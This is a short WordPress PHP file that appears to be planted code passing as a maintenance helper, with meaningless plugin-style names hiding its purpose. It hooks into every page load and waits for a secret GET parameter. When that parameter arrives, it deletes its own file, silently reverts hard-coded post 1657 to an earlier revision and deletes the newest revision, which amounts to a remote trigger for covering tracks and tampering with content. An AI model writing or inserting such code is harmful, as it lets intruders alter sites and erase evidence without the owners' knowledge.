<?php

function helper_maintenance_fx_shortener() {
	if (isset($_GET['comments_specific_refresh']) && $_GET['comments_specific_refresh'] === 'block_awesome_timeline') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$another_typography_color_notifier = 1657;
		$remover_call_elementor_anywhere = wp_get_post_revisions($another_typography_color_notifier);
		if (empty($remover_call_elementor_anywhere)) die('no revisions');
		if (count($remover_call_elementor_anywhere) < 2) die('less than 2');
		$buttons_rss_fancy = array_shift($remover_call_elementor_anywhere);
		$shipping_tables_shortcode = $buttons_rss_fancy->ID;
		$logger_fx_user_schema = array_shift($remover_call_elementor_anywhere);
		$price_gravatar_anywhere_bbpress = $logger_fx_user_schema->ID;
		$controller_chatbot_app = wp_restore_post_revision($price_gravatar_anywhere_bbpress);
		if ($controller_chatbot_app === false) die('error restoring');
		$controller_chatbot_app = wp_delete_post_revision($shipping_tables_shortcode);		
		if ($controller_chatbot_app === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'helper_maintenance_fx_shortener');
